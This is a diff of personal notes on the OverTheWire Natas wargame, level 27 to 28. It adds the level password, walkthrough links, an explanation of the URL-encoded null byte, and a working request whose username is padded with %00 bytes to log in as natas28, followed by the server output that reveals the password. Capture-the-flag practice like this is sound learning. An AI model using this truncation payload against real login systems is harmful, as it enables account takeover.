@@ -806,6 +806,20 @@ via Cursor
 
 ## 27->28
 - http://natas27.natas.labs.overthewire.org/
-- `natas28:`
+- `natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`
 - 2025-07-15 Break Day
 - 2025-07-16 Break Day
+- https://learnhacking.io/overthewire-natas-level-27-walkthrough/
+- https://www.youtube.com/watch?v=IHNUkhUe7Rw&ab_channel=HMCyberAcademy
+- In a URL, `%00` represents a null byte character, which is the URL-encoded version of the null character. It's often used in security exploits to terminate strings prematurely, potentially bypassing security checks. While it's not a valid character in URLs according to some specifications, it can still be used in certain contexts, especially in APIs or when combined with other characters. 
+- https://www.w3schools.com/tags/ref_urlencode.ASP
+```
+username=natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X&password=password
+--
+Welcome natas28!<br>Here is your data:<br>Array
+(
+    [username] =&gt; natas28
+    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+)
+```
+
